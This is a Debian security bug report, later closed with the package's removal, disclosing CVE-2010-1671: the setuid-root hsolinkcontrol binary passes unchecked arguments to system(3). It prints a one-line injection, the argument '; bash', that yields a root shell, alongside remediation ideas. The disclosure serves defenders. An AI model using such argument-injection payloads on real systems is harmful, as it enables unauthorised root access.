Package: hsolink
Version: 1.0.118-3
Severity: critical
Tags: security

Hi,

Following was reported by Christian Jaeger.

----------

hsolink-1.0.118 contains a binary hsolinkcontrol that is setuid root.
The binary

- neither sets PATH
- nor fixes other environment variables
- nor checks commandline arguments
- but uses system(3)
(- and may be overflowing fixed-size buffers as well, I didn't check anymore)

and thus is a trivial target to get root, for example:

(I've tested from the files in an ar-unpacked .deb instead of
installing the deb, to avoid exposing my system. Note: apparently the
binary has to be at root-owned paths or the Linux kernel will ignore
the setuid bit.)

novo:~/chris# l -a
total 12
-rwsr-xr-x  1 root root  7072 2010-07-09 22:20 hsolinkcontrol
drwxr-x---  2 root chris   80 2010-07-09 22:55 .
drwxr-xr-x 50 root root  4272 2010-07-09 22:55 ..

chris@novo:/root/chris$ ./hsolinkcontrol down '; bash'
Using resolvconf.
root@novo:/root/chris# id
uid=0(root) gid=1000(chris) groups=.....

The setuid recommendation is coming from the upstream author
(<http://www.pharscape.org/hsolinkcontrol.html>), who apparently is not
aware of the implications of the setuid bit, and good security in
general as evidenced by the problems I've listed above. I have not
informed him of the problem [yet].

I don't know about the right solution; maybe using sudo instead of
setuit and adding commandline argument checking and replacing system
calls with fork/exec* calls. Or, to be safer, instead rather turn it
into a daemon. Iff it needs to be run as ordinary users at all--I'm
used to have to run "pon" as root, for example, the charge to enable a
normal user to run hsolinkcontrol (or the program that uses it) as
root (by setting up sudo, for example) could possibly just be left to
the user (I can't say as I haven't used the program yet).

----------

Debian has assigned [CVE-2010-1671](https://security-tracker.debian.org/tracker/CVE-2010-1671) to this issue.

Cheers,
Thijs

I have filed a removal bug and hsolink has been removed (#590751).

Closing the bug.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the worldâs best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoftâs Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that arenât normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
